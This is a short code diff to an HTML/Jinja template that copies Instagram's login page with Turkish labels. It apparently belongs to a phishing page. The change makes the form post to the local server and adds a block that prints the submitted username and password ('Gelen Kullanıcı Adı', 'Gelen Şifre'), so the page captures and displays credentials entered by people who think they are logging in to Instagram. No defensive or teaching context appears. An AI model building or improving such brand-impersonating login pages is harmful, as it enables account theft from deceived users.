@@ -13,11 +13,18 @@
         <div class="form-section">
             <div class="login-box">
                 <h1 class="insta-logo">Instagram</h1>
-                <form method="post">
+                <form method="POST" action="/">
                     <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                     <input type="password" name="password" placeholder="Şifre" required>
                     <button type="submit">Giriş Yap</button>
                 </form>
+
+                {% if username and password %}
+                    <div style="margin-top: 15px; color: green;">
+                        <strong>Gelen Kullanıcı Adı:</strong> {{ username }}<br>
+                        <strong>Gelen Şifre:</strong> {{ password }}
+                    </div>
+                {% endif %}
 
                 <div class="divider">
                     <div></div>
@@ -44,4 +51,3 @@
     </div>
 </body>
 </html>
-
